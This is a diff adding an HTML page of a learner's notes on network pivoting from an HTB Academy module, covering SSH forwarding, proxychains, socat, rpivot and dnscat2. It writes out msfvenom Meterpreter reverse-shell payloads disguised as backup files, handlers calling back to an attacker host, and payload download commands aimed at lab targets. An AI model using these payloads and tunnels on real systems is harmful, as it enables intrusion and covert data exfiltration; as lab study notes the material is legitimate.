@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>pivoting, tunneling, and port forwarding :: peroxidee.global</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="pivoting Notes on pivoting from HTB Academy’s pivoting module INTRO Lateral movement is not the same pivoting because
+Lateral Movement is a technique used to gain access to additional hosts within a network environment. This also allows us sometimes to elevate our privileges. However, these are all within the same network. Pivoting is using hosts to cross network boundaries that you usually would not have access to, with the goal being more targeted." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="https://peroxidee.github.io/post/writeup/" />
+
+
+
+
+
+
+  
+  
+  
+  <link rel="stylesheet" href="https://peroxidee.github.io/css/pink-local.css">
+
+
+
+
+
+
+
+  <link rel="shortcut icon" href="https://peroxidee.github.io/img/theme-colors/pink.png">
+  <link rel="apple-touch-icon" href="https://peroxidee.github.io/img/theme-colors/pink.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="pivoting, tunneling, and port forwarding">
+<meta property="og:description" content="pivoting Notes on pivoting from HTB Academy’s pivoting module INTRO Lateral movement is not the same pivoting because
+Lateral Movement is a technique used to gain access to additional hosts within a network environment. This also allows us sometimes to elevate our privileges. However, these are all within the same network. Pivoting is using hosts to cross network boundaries that you usually would not have access to, with the goal being more targeted." />
+<meta property="og:url" content="https://peroxidee.github.io/post/writeup/" />
+<meta property="og:site_name" content="peroxidee.global" />
+
+  
+    <meta property="og:image" content="https://peroxidee.github.io/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-09-25 15:14:25 -0700 PDT" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="pink">
+
+
+<div class="container headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="https://peroxidee.github.io/">
+  <div class="logo">
+    Terminal
+  </div>
+</a>
+
+    </div>
+    
+    
+  </div>
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="https://peroxidee.github.io/post/writeup/">pivoting, tunneling, and port forwarding</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-09-25</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="pivoting">pivoting<a href="#pivoting" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<h2 id="notes-on-pivoting-from-htb-academys-pivoting-module">Notes on pivoting from HTB Academy’s pivoting module<a href="#notes-on-pivoting-from-htb-academys-pivoting-module" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<hr>
+<h3 id="intro">INTRO<a href="#intro" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p>Lateral movement is not the same pivoting because</p>
+<ul>
+<li>Lateral Movement is a technique used to gain access to additional hosts within a network environment. This also allows us sometimes to elevate our privileges. However, these are all within the same network.</li>
+<li>Pivoting is using hosts to cross network boundaries that you usually would not have access to, with the goal being more targeted. It is used to move between networks.</li>
+<li>Tunneling is using various protocols to shuttle traffic in and out of a network where there is a chance that we can be detected. By sending requests inside of HTTP or even HTTPS, we can hide our attacks in plain sight.</li>
+</ul>
+<p>IP Addresses are assigned to NICs, or Network Adapters. A computer can have more than one of these, and can also be on multiple networks. Looking for extra IP Address can help us see if there’s any other networks we may be apart of.</p>
+<p>Routers have routing tables that forwards traffic based on IP Addresses. This would be done by checking what address the packet has on it to be sent to, and it is then sent to the right gateway from the NIC.</p>
+<p>Protocols are rules that govern how we communicate over networks and which ports we can communicate to.</p>
+<hr>
+<h2 id="dynamic-port-forwarding-with-ssh-and-sockshttpsenwikipediaorgwikisocks-tunneling">Dynamic Port Forwarding With SSH and <a href="https://en.wikipedia.org/wiki/SOCKS">SOCKS</a> Tunneling.<a href="#dynamic-port-forwarding-with-ssh-and-sockshttpsenwikipediaorgwikisocks-tunneling" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Port fowarding is a technique that allows us to redirct a commmunication request from a port to another. This uses tcp as it’s layer, and SSH and SOCKS can be used to encapsulate the traffic. This can be used to bypass firewalls and gain access to other hosts in the network.</p>
+<p><img src="pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled.png" alt="Untitled"></p>
+<p>To execute the port forward, we should use this command.</p>
+<p><code>ssh -L 1234:localhost:3306 Ubuntu@10.129.202.6</code></p>
+<p>The -L command tells the SSH client to ask the SSH to forward all the data from port 22 to port 1234 to <a href="http://localhost:3306">localhost:3306</a> on the other server. By doing this, this allows to access the MySQL service from our port 1234. We can then use netstat or Nmap to check if this is working.</p>
+<p><code>nmap -v -sV -p1234 localhost</code></p>
+<p><code>netstat -antp | grep 1234</code></p>
+<p>We can also forward multiple ports using this same technique, using spaces.</p>
+<p><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@10.129.202.64</code></p>
+<p>Once you’ve port forwarded, you can usually use a commannd like <code>ifconfig</code> to check what NICs exist on the machine, which we can then use to see what other networks the host machine could be connected to.</p>
+<p>We don’t know what could lie on the other network. Once on here, we can use a Smaller IP range or just scan the entire subnet. In order to achive this and get to this spot, we will need to do dynamic port forwarding and pivoting. This can be done by starting a SOCKS listener on our local host, and then confgiuring SSH to forward our traffic via SSH to the other network. This is known as SSH tunneling over SOCKS proxy. SOCKS is Socket Secure, and it is a protocal that helps communicate with servers that have firewall restrictions in place. Unlike most cases where you would intitate a connection to connect to a service, in the case of SOCKS, the inital traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client side. Once the connection is established, network traffic cna be routed through the SOCKS server on behalf of the connected client.</p>
+<p>This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from NAT networks. SOCKS proxies are currently of two types, SOCKS4 and SOCKS5. SOCKS does not provide any authentication and UDP support, where 5 allows authetication.</p>
+<p>Here is an image of a network that’s on NAT, of 172.16.5.0/23, which we cannot access directly.</p>
+<p><img src="pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%201.png" alt="Untitled"></p>
+<p>The attack host starts the SSH client and requests the SSH server to allow it send some TCP data over the ssh socket. The SSH responds with an acknowledgement, and the SSH client then starts listening on <a href="http://localhost:9050">localhost:9050</a>. Whatever data you send to this port will broadcast to the entire network, 172.16.5.0/23 over SSH. We can use the command below to perform this dynamic port forwarding.</p>
+<p><code>ssh -D 9050 ubuntu@10.129.202.64</code></p>
+<p>The -D argurment tells the SSH server to endable dynamic port forwarding. Once it’s enabled, it will reqiure a tool that can route our packets over the port 9050. A tool we’re using is called proxychains, this is capable of redirecting TCP connections thorugh TOR, SOCKS, and HTTP/S proxy servers and also allows us to chain multiple servers togtehr. Using this, we can hide the IP address of both teh requesting and receiving hosts, and these two can only see the IP of the pivot host. This tool is often used to force TCP Traffic to go through hosted proxies like SOCKS4/5, TOR, or HTTP/S proxies.</p>
+<p>To inform proxychains that we must use port 9050, we must modify the configuration file at /etc/proxychains.conf. Then, we add <code>socks4 127.0.0.1 9050</code> to this file, if it’s not already there.</p>
+<p><code>tail -4 /etc/proxychains.conf</code></p>
+<p>Now when we start Nmap with proxychains, it will route all Nmap comands to the local port 9050, where SSH is listening, which will then forward everything over SSH to the other network.</p>
+<p><code>proxychains nmap -v -sn 172.16.5.1-200</code></p>
+<p>This is known as SOCKS tunneling. We cna only do a full TCP connect scan, as proxychains only understands full packets. ICMP requests are also blocked by Windows Defender. The full TCP scan will take a long time so we should instead only target a single target.</p>
+<p><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></p>
+<p>Metasploit can also be used with proxychains.</p>
+<p><code>proxychains msfconsole</code></p>
+<p>The application of Dynamic Port Forwarding is interesting because of how it allowed me to send packets from my machine through another. I found that loging in through metas</p>
+<hr>
+<h2 id="remotereverse-port-fowarding-with-ssh">Remote/Reverse Port Fowarding with SSH<a href="#remotereverse-port-fowarding-with-ssh" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Now that we’ve done local port forwading, where SSH can listen on our local hos and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host. We also might want to consider that we should forward a local service to a local port. Let’s use our previous example.</p>
+<p><img src="pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%202.png" alt="Untitled"></p>
+<p>The outgoing connection for the Windows host is only limited to the 172.16.5.0/23 network, because Windows host does not have any direct connection with the network the attack host is on. This means that if we try to use metasploit to gain a foothold, we won’t be able to because the Windows server cannot route to have traffic leaving it’s network.</p>
+<p>Often, we won’t be able to get an RDC, and so we need to find a pivot host, a connection point between our attack host and the Window server. This will be the ubuntu server. We will need to create a Meterpeter HTTPS payload, using msfvenom, but configure the reverse connection to use the Ubuntu’s server.</p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InternalIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></p>
+<p><code>use exploit/multi/handler</code></p>
+<p>Once the payload is created and our listener exist, we can copy this payload to the Ubuntu machine using SCP beecause we have the credentials.</p>
+<p><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></p>
+<p><code>python3 -m http.server 8123</code></p>
+<p>Once on the ubuntu server, we can then use it to upload our payload to the windows server, by invoking it as a web request.</p>
+<p><code>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></p>
+<p>Once this payload is downloaded, we can use our SSH port fowarding remotely to forward the port 8000 to the Ubuntu’s 8080 port. We can then use the -vN argument in our SSH command to make it verbose and ask it not to prompt the login shell. The -R asks us to remotely listen on the target, and send all incoming 8080 connections to us.</p>
+<p>After doing this, we should have a session established from meterpreter.</p>
+<p><img src="pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%203.png" alt="Untitled"></p>
+<hr>
+<h2 id="meterpreter-tunneling-and-port-forwarding">Meterpreter Tunneling and Port Forwarding<a href="#meterpreter-tunneling-and-port-forwarding" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>In the case where we can use meterpreter without having to care for SSH, we can use pivots with our session as well. We can create a shell for the Ubuntu server which will allow us to return a shell on our attack host on port 8080</p>
+<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080</code></p>
+<p>After creating the payload, we should start a handler to handle our payload.</p>
+<p><code>msf6 &gt; use exploit/multi/handle</code></p>
+<p>We can take the payload titled <code>backupjob</code> to the ubuntu host over SSH - scp, once this works out, we need to run it on there. Running this will tunnel us through the other machine.</p>
+<p>Once we’ve established our meterpreter tunnel, we can run a ping sweep. We know that our Windows target is on 172.16.5.0/23 network, and assuming that the firewall on the Windows target is allowing us to do an ICMP request, we can perform a ping sweep on the network. We can do this using Meterpreter with the ping_sweep module, which will sweep the network with ICMP requests.</p>
+<p><code>run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></p>
+<p>We can also do a ping sweep with a for loop in bash.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i in <span style="color:#f92672">{</span>1..254<span style="color:#f92672">}</span> ;<span style="color:#66d9ef">do</span> <span style="color:#f92672">(</span>ping -c <span style="color:#ae81ff">1</span> 172.16.5.$i | grep “bytes from” &amp;<span style="color:#f92672">)</span> ;<span style="color:#66d9ef">done</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> /L %i in <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> <span style="color:#ae81ff">1</span> 254<span style="color:#f92672">)</span> <span style="color:#66d9ef">do</span> ping 172.16.5.%i -n <span style="color:#ae81ff">1</span> -w <span style="color:#ae81ff">100</span> | find “Reply”
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#ae81ff">1</span>.<span style="color:#ae81ff">.254</span> | % {<span style="color:#960050;background-color:#1e0010">”</span><span style="color:#ae81ff">172.16</span>.5.$($_)<span style="color:#960050;background-color:#1e0010">:</span> $(Test-Connection -count <span style="color:#ae81ff">1</span> -comp <span style="color:#ae81ff">172.15</span>.5.$($_) -quiet)<span style="color:#960050;background-color:#1e0010">”</span>}
+</span></span></code></pre></div><p>A ping sweep may not work the first time you run it, because a host may not have built it’s arp cache yet. You should run this twice to make sure you know have the arp cache.</p>
+<p>There might be scenarios where we cannot do a ping sweep, because of the firewall. In this case, we need to do a TCP scan on the 172.16.5.0/23 network. We can use NMAP for this, as well as Metasploit’s post-exploitation roting module called socks_proxy to configure a local netowrk proxy on our attack host. We can configure the socks proxy for v4, and this will start us a listener on port 9050 and route all of that traffic recived through our meterpreter session.</p>
+<p><code>msf6 &gt; use auxiliary/server/socks_proxy</code></p>
+<p>We will also need to make sure to configure our proxy.</p>
+<p>Once this server is up and running, we can configure proxychains to route traffic to our pivot on the ubuntu host. Make sure to add the line discussed above to the end of the file.</p>
+<p>After that, we need to tell our socks_proxy module to route the traffic via our meterpreter session, we can use the <code>post/multi/manage/autoroute</code> mod from Metasploit to add these routes for the 172.16.5.0 subnet and then route the traffic from proxychains.</p>
+<p><code>msf6 &gt; use post/multi/manage/autoroute</code></p>
+<p>we can also do this from the Meterpreter session.</p>
+<p><code>run autoroute -s 172.16.5.0/23</code></p>
+<p>We can use the <code>portfwd</code> module on Meterpreter to enable a listner on our attack host, and then forward all of our packets to the attack host. This command below asks to create a listener on the attack host’s local port of 3300, and then forwards all these packets to the remote windows server on port 3389 through our meterpreter session.</p>
+<p><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r 172.16.5.19</code></p>
+<p>Again, using xfreerdp, we can now create a remote desktop session.</p>
+<p>Meterpreter can also reverse port forward where we can listen on a specific port on the server and send all shells from the ubuntu server to our attack host.</p>
+<p><code>portfwd add -R -l 8081 -p 1234 -L 10.10.14.18</code></p>
+<hr>
+<h2 id="socat-redirection-with-a-reverse-shell">Socat Redirection with a Reverse Shell<a href="#socat-redirection-with-a-reverse-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Socat is a tool that we can use to relay and create pipe sockets between 2 independtent network chanels without needing to use SSH tunneling. It acts a redirector that can listen and forward data between hosts. This is the same principal as SSH Tunneling, but isn’t the exact thing.</p>
+<p><code>socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80</code></p>
+<p>This command tells us that Socat will be listening on 8080, and forward our traffic to port 80 on the attack host. We can use this to create a payload and send it to the Socat, allowing us to access the vulnerable windows host yet again.</p>
+<p><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080</code></p>
+<p>To get this to the host, we can use a technique we did in the last one.</p>
+<p><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></p>
+<p>Then,</p>
+<pre tabindex="0"><code>msf6 &gt; use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_https
+payload =&gt; windows/x64/meterpreter/reverse_https
+msf6 exploit(multi/handler) &gt; set lhost 0.0.0.0
+lhost =&gt; 0.0.0.0
+msf6 exploit(multi/handler) &gt; set lport 80
+lport =&gt; 80
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started HTTPS reverse handler on https://0.0.0.0:80
+</code></pre><hr>
+<h2 id="socat-redirection-with-a-bind-shell">Socat Redirection with a Bind Shell<a href="#socat-redirection-with-a-bind-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Similar to socat’s reverse shell redirector, the same technique can also be applied to bind shells. This is not the same as reverse shells because those connect from the windows server, and then back to us. A bind shell will start a listener on a specific port of a machine. This payload will be executed on the Window smachine, and then be redirected through a socat listener on our Ubuntu machine by connecting through <code>port 8443</code>.</p>
+<p><img src="pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%204.png" alt="Untitled"></p>
+<p>We can use msfvenom to create our payload.</p>
+<p><code>msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8843</code></p>
+<p>Then, we will use socat on the ubuntu machine to create a listener to port forward from.</p>
+<p><code>socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443</code></p>
+<p>Finally, we can start our bind handler on metasploit.</p>
+<pre tabindex="0"><code>msf6 &gt; use exploit/multi/handler
+
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/bind_tcp
+payload =&gt; windows/x64/meterpreter/bind_tcp
+msf6 exploit(multi/handler) &gt; set RHOST 10.129.202.64
+RHOST =&gt; 10.129.202.64
+msf6 exploit(multi/handler) &gt; set LPORT 8080
+LPORT =&gt; 8080
+msf6 exploit(multi/handler) &gt; run
+
+[*] Started bind TCP handler against 10.129.202.64:8080
+</code></pre><hr>
+<h2 id="ssh-for-windows-plinkexe">SSH for Windows: plink.exe<a href="#ssh-for-windows-plinkexe" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Plink is an application and cmd ssh tool that is on any PuTTY package. This can be used to create a dyanmic port fowards and SOCKS Proxies. PuTTY is how most Windows users downloaded ssh onto the operating system.</p>
+<p>We’ll use this as an example.</p>
+<p><img src="pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%205.png" alt="Untitled"></p>
+<p>The Windows attack host uses the Plink as a process. Starting this in Windows is as easy as using this command line argurment,</p>
+<p><code>plink -D 9050 ubuntu@10.129.15.50</code></p>
+<p>This will start our SSH session between Windows and Ubutnu, and allows us to port forward between the two computers.</p>
+<p>We can also use the tool titled <a href="https://www.proxifier.com/">Proxifer</a>, which will allow us to start SOCKS Tunnels through the SSH Session we created. This allows us to proxy chain over windows.</p>
+<p>Once everything has been set, we can use mstsc.exe to start our RDP session with a windows target.</p>
+<hr>
+<h2 id="web-server-pivoting-with-rpivot">Web Server Pivoting with Rpivot<a href="#web-server-pivoting-with-rpivot" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Rpivot is a reverse SOCKS proxy tool made in python that allows of SOCKS Tunneling. This will bind a machine in a netwrok to a server that exists outside of it, and then allow us to connect throguh that server.</p>
+<p><img src="pivoting%205e0943720ee64c3992f4cee1d5e64b90/Untitled%206.png" alt="Untitled"></p>
+<p>We first need to install it through github.</p>
+<p><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></p>
+<p><code>sudo apt-get install python2.7</code></p>
+<p>we then can start our rpviot SOCKS proxy with <code>server.py</code>.</p>
+<p><code>python2.7 [server.py](http://server.py) —proxy-port 9050 —server-port 9999 —server-ip 0.0.0.0</code></p>
+<p>Before we run <a href="http://client.py">client.py</a> we need to move rpivot to the target, and we cna do this using scp.</p>
+<p><code>scp -r rpivot ubuntu@&lt;IpaddressOfTarget&gt;:/home/ubuntu/</code></p>
+<p>Once we’re on the actual pivot host, we need to connect to the client.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ubuntu@WEB01:~/rpivot$ python2.7 client.py --server-ip 10.10.14.18 --server-port 9999Backconnecting to server 10.10.14.18 port <span style="color:#ae81ff">9999</span>
+</span></span></code></pre></div><p>Once we’re on here, we can set proxychains to pivot from our local server on 127.0.0.1:9050, and we can access this webserver from our server, and access it through <code>proxychains firefox-esr 172.16.5.135:80.</code></p>
+<p>Finally, there can be times whne we can’t pivot through the external server, because of NTLM authneticaiton confiugrations with the domain controlller. In these cases, we can use NTLM to allow rpivot to authentiate via NTLM proxy by providing a username and password. We can use our proxy with <a href="http://client.py">client.py</a> like this.</p>
+<p><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip &lt;IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></p>
+<p><em>Couldn’t get this one figured out tbh, issue w python install lol</em></p>
+<hr>
+<h2 id="dns-tunneling-with-dnscat2">DNS Tunneling with Dnscat2<a href="#dns-tunneling-with-dnscat2" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Dnscat2 is a tunnleing tool that use the DNS protocol to send data between two hosts. It uses an eecnryptued C2 channel and sends data thru TXT records within the DNS protocol. AD will usually have it’s own DNS server, which will resovle hostsnames ot IPs and route these traffics to DNS. However, this addres resoultion, with dnscat2, is done through an external server. This is because when a local DNS server attempts to resolve an address, the data is exlfiltraed and sent over the netowrk, instead of a legitamte DNS request. Dnscat2 can be an extremely stealthy approach to exfiltrate data when avoidning firewall detections, which sniff traffic. For our example, we can use this to get to the Windows hosts.</p>
+<p><code>git clone https://github.com/iagox86/dnscat2.git</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd dnscat2/server/
+</span></span><span style="display:flex;"><span>sudo gem install bundler
+</span></span><span style="display:flex;"><span>bundle install
+</span></span></code></pre></div><p><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></p>
+<p>ran into these errors:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Fetching gem metadata from https://rubygems.org/.......
+</span></span><span style="display:flex;"><span>Fetching ecdsa 1.2.0
+</span></span><span style="display:flex;"><span>Fetching salsa20 0.1.1
+</span></span><span style="display:flex;"><span>Fetching trollop 2.1.2
+</span></span><span style="display:flex;"><span>Fetching sha3 1.0.1
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>2/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>2/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/trollop-2.1.2.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>3/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>3/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/trollop-2.1.2.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>4/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>4/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/trollop-2.1.2.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>2/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/salsa20-0.1.1.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>3/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/salsa20-0.1.1.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>2/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/sha3-1.0.1.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>4/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/salsa20-0.1.1.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>3/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/sha3-1.0.1.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Retrying download gem from https://rubygems.org/ due to error <span style="color:#f92672">(</span>4/4<span style="color:#f92672">)</span>: Bundler::PermissionError There was an error <span style="color:#66d9ef">while</span> trying to write to <span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/sha3-1.0.1.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions <span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Bundler::PermissionError: There was an error <span style="color:#66d9ef">while</span> trying to write to
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>/var/lib/gems/3.0.0/cache/ecdsa-1.2.0.gem<span style="color:#e6db74">`</span>. It is likely that you need to grant write permissions
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> that path.
+</span></span><span style="display:flex;"><span>  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/shared_helpers.rb:105:in <span style="color:#e6db74">`</span>rescue in
+</span></span><span style="display:flex;"><span>filesystem_access<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/shared_helpers.rb:102:in `filesystem_access&#39;</span>
+</span></span><span style="display:flex;"><span>/var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/rubygems_integration.rb:483:in <span style="color:#e6db74">`</span>block in
+</span></span><span style="display:flex;"><span>download_gem<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/retry.rb:40:in `run&#39;</span>
+</span></span><span style="display:flex;"><span>  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/retry.rb:30:in <span style="color:#e6db74">`</span>attempt<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  /var/lib/gems/3.0.0/gems/bundler-2.4.19/lib/bundler/rubygems_integration.rb:474:in `download_gem&#39;</span>
